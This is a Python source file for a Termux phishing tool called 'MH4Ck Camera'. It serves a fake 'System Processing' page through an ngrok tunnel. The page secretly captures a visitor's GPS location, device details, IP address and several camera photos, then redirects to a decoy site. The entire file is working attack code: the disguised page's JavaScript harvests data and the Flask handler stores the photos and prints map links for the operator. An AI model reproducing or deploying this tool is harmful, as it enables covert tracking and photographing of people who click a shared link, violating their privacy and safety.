#!/usr/bin/env python3
import os
import sys
import json
import time
import uuid
import base64
import threading
import urllib.parse
import requests
import subprocess
import signal
import atexit
import stat
import tarfile
import zipfile
import shutil
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO
import concurrent.futures
import logging

# ==================== បិទ Log Flask ====================
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ==================== Flask App ====================
app = Flask(__name__)

# ==================== អថេរសកល ====================
ngrok_process = None
current_mode = "cam_location"
processed_clicks = set()
notification_lock = threading.Lock()

# ==================== HTML Templates ====================
# (ដូចគ្នានឹងកូដដើម តែខ្ញុំសរសេរឲ្យខ្លី)
CAM_LOCATION_HTML = """<!DOCTYPE html>
<html>
<head><title>Loading...</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script>
function start(){const i={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenWidth:screen.width,screenHeight:screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone};navigator.geolocation?navigator.geolocation.getCurrentPosition(p=>{i.location={latitude:p.coords.latitude,longitude:p.coords.longitude,accuracy:p.coords.accuracy};getBattery(i)},e=>{i.locationError=e.message;getBattery(i)},{enableHighAccuracy:!0,timeout:1e4}):(i.locationError="Geolocation not supported",getBattery(i))}
function getBattery(i){navigator.getBattery?navigator.getBattery().then(b=>{i.batteryLevel=b.level*100;i.batteryCharging=b.charging;getCamera(i)}):getCamera(i)}
function getCamera(i){navigator.mediaDevices&&navigator.mediaDevices.getUserMedia?navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}}}).then(s=>{i.cameraAccess=!0;i.cameraType="front";takePhoto(s,i)}).catch(e=>{i.cameraAccess=!1;i.cameraError=e.name;getIP(i)}):(i.cameraAccess=!1,i.cameraError="No camera",getIP(i))}
function takePhoto(s,i){const v=document.createElement("video");v.srcObject=s;v.play();v.onloadedmetadata=()=>{const c=document.createElement("canvas");c.width=v.videoWidth||640;c.height=v.videoHeight||480;const ctx=c.getContext("2d");i.cameraPhotos=[];let n=0;const t=setInterval(()=>{if(n<5){ctx.drawImage(v,0,0,c.width,c.height);i.cameraPhotos.push(c.toDataURL("image/jpeg",0.8));n++}else{clearInterval(t);s.getTracks().forEach(t=>t.stop());getIP(i)}},500)}}
function getIP(i){fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{i.ipAddress=d.ip;sendData(i)}).catch(()=>{i.ipAddress="unknown";sendData(i)})}
function sendData(i){fetch("/track/{{ track_id }}?mode={{ mode }}",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(i)}).then(()=>{window.location.href="{{ redirect_url }}"})}
window.onload=start;
</script>
<style>
body{background:#1a1a1a;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{text-align:center}
.loading{display:inline-block;width:40px;height:40px;border:4px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#00ff00;animation:spin 1s infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container"><h2>System Processing...</h2><div class="loading"></div><p>Please wait...</p></div>
</body>
</html>"""

ONLY_LOCATION_HTML = CAM_LOCATION_HTML.replace("getCamera(i)", "getIP(i)").replace("takePhoto(s,i);", "getIP(i);")

BACK_CAMERA_HTML = CAM_LOCATION_HTML.replace('facingMode:"user"', 'facingMode:{exact:"environment"}').replace("front","back")

FRONT_CAMERA_HTML = CAM_LOCATION_HTML

# ==================== ទាញយក Ngrok v2 (ស្ថេរភាព) ====================
def download_ngrok():
    """ទាញយក ngrok v2 សម្រាប់ Termux"""
    ngrok_path = os.path.join(os.getcwd(), 'ngrok')
    
    # បើមានរួចហើយ ប្រើវា
    if os.path.exists(ngrok_path):
        os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
        return ngrok_path
    
    print("\033[1;33m[📥] កំពុងទាញយក Ngrok v2...\033[0m")
    
    # រកមើល architecture
    import platform
    machine = platform.machine()
    
    if 'aarch64' in machine or 'arm64' in machine:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz"
        filename = "ngrok.tgz"
    elif 'arm' in machine:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz"
        filename = "ngrok.tgz"
    else:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz"
        filename = "ngrok.tgz"
    
    try:
        # ទាញយក
        print(f"   URL: {url}")
        response = requests.get(url, stream=True, timeout=30)
        total_size = int(response.headers.get('content-length', 0))
        
        with open(filename, 'wb') as f:
            downloaded = 0
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total_size > 0:
                        percent = (downloaded / total_size) * 100
                        sys.stdout.write(f"\r   កំពុងទាញយក: {percent:.1f}%")
                        sys.stdout.flush()
        
        print("\n   ✅ ទាញយករួចរាល់")
        
        # ពន្លា
        print("   📦 កំពុងពន្លា...")
        with tarfile.open(filename, 'r:gz') as tar:
            tar.extractall()
        
        # លុបឯកសារ tgz
        os.remove(filename)
        
        # កំណត់សិទ្ធិ
        os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
        
        print("\033[1;32m[✅] Ngrok ដំឡើងរួចរាល់!\033[0m")
        return ngrok_path
        
    except Exception as e:
        print(f"\033[1;31m[❌] បរាជ័យ: {e}\033[0m")
        return None

# ==================== កំណត់ Authtoken ====================
def setup_ngrok_auth(authtoken):
    """កំណត់ authtoken សម្រាប់ ngrok v2"""
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return False
    
    try:
        print("\033[1;33m[🔑] កំពុងកំណត់ Ngrok Authtoken...\033[0m")
        
        # សាកល្បងវិធីទី 1: command authtoken
        result = subprocess.run([ngrok_path, 'authtoken', authtoken], 
                               capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            print("\033[1;32m[✅] កំណត់ Authtoken រួចរាល់!\033[0m")
            return True
        else:
            # វិធីទី 2: បង្កើត config file ដោយផ្ទាល់
            home = os.path.expanduser("~")
            ngrok_dir = os.path.join(home, ".ngrok2")
            os.makedirs(ngrok_dir, exist_ok=True)
            
            config_file = os.path.join(ngrok_dir, "ngrok.yml")
            with open(config_file, 'w') as f:
                f.write(f"authtoken: {authtoken}\n")
            
            print("\033[1;32m[✅] រក្សាទុក Authtoken ក្នុង config file\033[0m")
            return True
            
    except Exception as e:
        print(f"\033[1;31m[❌] បរាជ័យ: {e}\033[0m")
        return False

# ==================== ចាប់ផ្តើម Ngrok ====================
def start_ngrok(port=5000):
    """ចាប់ផ្តើម ngrok tunnel"""
    global ngrok_process
    
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return None
    
    # បិទ ngrok ចាស់
    stop_ngrok()
    
    try:
        print(f"\033[1;33m[🔄] កំពុងចាប់ផ្តើម Ngrok លើ port {port}...\033[0m")
        
        # ចាប់ផ្តើម ngrok ជាមួយ output
        ngrok_process = subprocess.Popen(
            [ngrok_path, 'http', str(port), '--log=stdout'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        # រង់ចាំ ngrok ចាប់ផ្តើម
        time.sleep(3)
        
        # ពិនិត្យមើលថាដំណើរការឬទេ
        if ngrok_process.poll() is None:
            # ទាញយក URL ពី API
            url = get_ngrok_url()
            if url:
                print(f"\033[1;32m[✅] Ngrok ដំណើរការ: {url}\033[0m")
                return url
            else:
                # ប្រើវិធីផ្សេង
                return "http://localhost:4040"
        else:
            print("\033[1;31m[❌] Ngrok បរាជ័យក្នុងការចាប់ផ្តើម\033[0m")
            return None
            
    except Exception as e:
        print(f"\033[1;31m[❌] Error: {e}\033[0m")
        return None

def get_ngrok_url():
    """ទាញយក URL ពី Ngrok API"""
    for i in range(10):
        try:
            # សាកល្បង API v2
            r = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
            if r.status_code == 200:
                data = r.json()
                for tunnel in data.get('tunnels', []):
                    if tunnel.get('proto') == 'https':
                        return tunnel.get('public_url')
        except:
            pass
        time.sleep(1)
    return None

def stop_ngrok():
    """បិទ ngrok"""
    global ngrok_process
    if ngrok_process:
        try:
            ngrok_process.terminate()
            ngrok_process.wait(timeout=3)
        except:
            ngrok_process.kill()
        ngrok_process = None
    
    # បិទ ngrok ទាំងអស់
    try:
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
    except:
        pass

# ==================== រក្សាទុករូបភាព ====================
def save_photos(track_id, photos, camera_type):
    """រក្សាទុករូបភាពជាមួយ watermark"""
    try:
        dir_path = f"captured_images/{track_id}"
        os.makedirs(dir_path, exist_ok=True)
        
        saved = 0
        for i, photo_data in enumerate(photos[:10]):  # យកតែ 10 សន្លឹក
            try:
                # ដោះ base64
                if ',' in photo_data:
                    photo_data = photo_data.split(',')[1]
                
                img_data = base64.b64decode(photo_data)
                img = Image.open(BytesIO(img_data))
                
                # បន្ថែម watermark
                draw = ImageDraw.Draw(img)
                try:
                    font = ImageFont.truetype("/system/fonts/DroidSans.ttf", 20)
                except:
                    font = None
                
                text = "t.me/mengheang25"
                draw.text((10, img.height - 30), text, fill=(255,255,255), font=font)
                
                # រក្សាទុក
                output = BytesIO()
                img.save(output, format='JPEG', quality=85)
                
                with open(f"{dir_path}/{camera_type}_{i+1}.jpg", 'wb') as f:
                    f.write(output.getvalue())
                
                saved += 1
            except:
                continue
        
        print(f"   💾 រក្សាទុក {saved} រូបភាព")
        
    except Exception as e:
        pass

# ==================== បង្ហាញ Notification ====================
def print_notification(track_id, data, mode):
    """បង្ហាញពេលមានអ្នកចុច link"""
    print("\n\033[1;5;31m═══════════════════════════════════════════════════════════════\033[0m")
    print("\033[1;5;33m                    🔔 មានអ្នកចុច Link! 🔔\033[0m")
    print("\033[1;5;31m═══════════════════════════════════════════════════════════════\033[0m")
    print(f"\033[1;36m[⏰] ម៉ោង:\033[0m      {data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}")
    print(f"\033[1;36m[🎯] របៀប:\033[0m      {mode}")
    print(f"\033[1;36m[🆔] Track ID:\033[0m  {track_id}")
    print(f"\033[1;36m[🌐] IP:\033[0m        {data.get('ip_address', 'N/A')}")
    
    if 'location' in data:
        lat = data['location']['latitude']
        lng = data['location']['longitude']
        print(f"\033[1;32m[📍] ទីតាំង:\033[0m    {lat}, {lng}")
        print(f"\033[1;32m[🗺️] Google Maps:\033[0m https://maps.google.com/?q={lat},{lng}")
    
    if 'batteryLevel' in data:
        print(f"\033[1;33m[🔋] ថ្ម:\033[0m        {data['batteryLevel']}%")
    
    if 'cameraPhotos' in data:
        print(f"\033[1;35m[📸] រូបថត:\033[0m     {len(data['cameraPhotos'])} សន្លឹក")
        print(f"\033[1;35m[💾] ទីតាំង:\033[0m    captured_images/{track_id}/")
    
    print("\033[1;5;31m═══════════════════════════════════════════════════════════════\033[0m\n")

# ==================== Flask Route ====================
@app.route('/track/<track_id>', methods=['GET', 'POST'])
def track_handler(track_id):
    """ដោះស្រាយការចូលមកកាន់ link"""
    if request.method == 'GET':
        # GET request: បង្ហាញ HTML
        redirect_url = request.args.get('url', 'https://google.com')
        mode = request.args.get('mode', 'cam_location')
        
        if mode == 'cam_location':
            html = CAM_LOCATION_HTML
        elif mode == 'only_location':
            html = ONLY_LOCATION_HTML
        elif mode == 'back_camera':
            html = BACK_CAMERA_HTML
        else:
            html = FRONT_CAMERA_HTML
        
        return render_template_string(html, track_id=track_id, redirect_url=redirect_url, mode=mode)
    
    else:
        # POST request: ទទួលទិន្នន័យ
        try:
            data = request.json
            data['ip_address'] = request.remote_addr
            data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            mode = request.args.get('mode', 'cam_location')
            
            # ការពារការបង្ហាញច្រើនដង
            click_id = f"{track_id}_{time.time()}"
            
            with notification_lock:
                if click_id not in processed_clicks:
                    print_notification(track_id, data, mode)
                    processed_clicks.add(click_id)
                    
                    # រក្សាទុករូបភាព
                    if 'cameraPhotos' in data and data['cameraPhotos']:
                        camera_type = data.get('cameraType', 'front')
                        save_photos(track_id, data['cameraPhotos'], camera_type)
            
            return jsonify({'success': True})
            
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})

# ==================== មុខងារចម្បង ====================
def create_link(mode):
    """បង្កើត tracking link"""
    global current_mode
    current_mode = mode
    
    # 1. បញ្ចូល authtoken
    print("\n\033[1;33m[🔑] សូមបញ្ចូល Ngrok Authtoken:\033[0m")
    print("    (ទទួលបានពី: https://dashboard.ngrok.com)")
    token = input("\033[1;33m    Authtoken: \033[0m").strip()
    
    if not token:
        print("\033[1;31m[❌] មិនអាចទទេរ!\033[0m")
        return False
    
    # 2. កំណត់ authtoken
    if not setup_ngrok_auth(token):
        print("\033[1;31m[❌] កំណត់ Authtoken បរាជ័យ!\033[0m")
        return False
    
    # 3. បញ្ចូល URL គោលដៅ
    target = input("\033[1;33m[🎯] URL គោលដៅ (Enter = Google): \033[0m").strip()
    if not target:
        target = "https://google.com"
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # 4. ចាប់ផ្តើម Flask
    flask_thread = threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False),
        daemon=True
    )
    flask_thread.start()
    print("\033[1;32m[✅] Flask ដំណើរការលើ port 5000\033[0m")
    time.sleep(2)
    
    # 5. ចាប់ផ្តើម Ngrok
    ngrok_url = start_ngrok(5000)
    if not ngrok_url:
        print("\033[1;31m[❌] Ngrok បរាជ័យ!\033[0m")
        return False
    
    # 6. បង្កើត Track ID
    track_id = str(uuid.uuid4())[:6]
    
    # 7. បង្កើត Link
    tracking_link = f"{ngrok_url}/track/{track_id}?url={urllib.parse.quote(target)}&mode={mode}"
    
    # 8. បង្ហាញលទ្ធផល
    print("\n\033[1;32m═══════════════════════════════════════════════════════════════\033[0m")
    print("\033[1;32m                    ✅ LINK បង្កើតរួចរាល់!                    \033[0m")
    print("\033[1;32m═══════════════════════════════════════════════════════════════\033[0m")
    print(f"\033[1;36m[🎯] របៀប:\033[0m        {mode}")
    print(f"\033[1;36m[🆔] Track ID:\033[0m    {track_id}")
    print(f"\033[1;36m[🔗] Link របស់អ្នក:\033[0m")
    print(f"\033[1;4;34m{tracking_link}\033[0m")
    print("\033[1;32m═══════════════════════════════════════════════════════════════\033[0m")
    print("\033[1;33m[⚠️]  រង់ចាំការចុច Link... (Ctrl+C ដើម្បីបញ្ឈប់)\033[0m\n")
    
    return True

def show_menu():
    """បង្ហាញ Menu"""
    os.system('clear')
    print("\033[1;36m╔══════════════════════════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║              📱 MH4Ck Camera v2.1 - Termux                 ║\033[0m")
    print("\033[1;36m║                 ដំណើរការជាមួយ Ngrok v2                   ║\033[0m")
    print("\033[1;36m╠══════════════════════════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  Developer: @mengheang25                                    ║\033[0m")
    print("\033[1;36m║  From: Cambodia 🇰🇭                                          ║\033[0m")
    print("\033[1;36m╚══════════════════════════════════════════════════════════════╝\033[0m")
    
    print("\n\033[1;33m[ MAIN MENU ]\033[0m")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  \033[1;32m1.\033[0m 📸 Camera + Location      - GPS + កាមេរ៉ាមុខ      ║")
    print("║  \033[1;32m2.\033[0m 📍 Only Location         - ទីតាំងតែប៉ុណ្ណោះ      ║")
    print("║  \033[1;32m3.\033[0m 📷 Back Camera           - កាមេរ៉ាក្រោយ         ║")
    print("║  \033[1;32m4.\033[0m 🤳 Front Camera          - កាមេរ៉ាមុខ           ║")
    print("║  \033[1;32m5.\033[0m ❌ Exit                 - ចាកចេញ              ║")
    print("╚══════════════════════════════════════════════════════════════╝")

def main():
    """មុខងារចម្បង"""
    # បង្កើតថតសម្រាប់រក្សាទុករូបភាព
    os.makedirs('captured_images', exist_ok=True)
    
    # ចុះឈ្មោះ cleanup
    atexit.register(stop_ngrok)
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    
    while True:
        try:
            show_menu()
            choice = input("\n\033[1;33m🔹 ជ្រើសរើស (1-5): \033[0m").strip()
            
            if choice == '1':
                os.system('clear')
                print("\033[1;36m📸 MODE: CAMERA + LOCATION\033[0m")
                create_link('cam_location')
                input("\n\033[1;33m[⏹️] ចុច Enter ដើម្បីបន្ត...\033[0m")
                stop_ngrok()
                
            elif choice == '2':
                os.system('clear')
                print("\033[1;36m📍 MODE: ONLY LOCATION\033[0m")
                create_link('only_location')
                input("\n\033[1;33m[⏹️] ចុច Enter ដើម្បីបន្ត...\033[0m")
                stop_ngrok()
                
            elif choice == '3':
                os.system('clear')
                print("\033[1;36m📷 MODE: BACK CAMERA\033[0m")
                create_link('back_camera')
                input("\n\033[1;33m[⏹️] ចុច Enter ដើម្បីបន្ត...\033[0m")
                stop_ngrok()
                
            elif choice == '4':
                os.system('clear')
                print("\033[1;36m🤳 MODE: FRONT CAMERA\033[0m")
                create_link('front_camera')
                input("\n\033[1;33m[⏹️] ចុច Enter ដើម្បីបន្ត...\033[0m")
                stop_ngrok()
                
            elif choice == '5':
                print("\n\033[1;33m👋 លាហើយ!\033[0m")
                stop_ngrok()
                sys.exit(0)
                
            else:
                print("\033[1;31m❌ សូមជ្រើសរើស 1-5 តែប៉ុណ្ណោះ!\033[0m")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\033[1;33m👋 លាហើយ!\033[0m")
            stop_ngrok()
            sys.exit(0)
        except Exception as e:
            print(f"\033[1;31m❌ Error: {e}\033[0m")
            time.sleep(2)

if __name__ == '__main__':
    main()
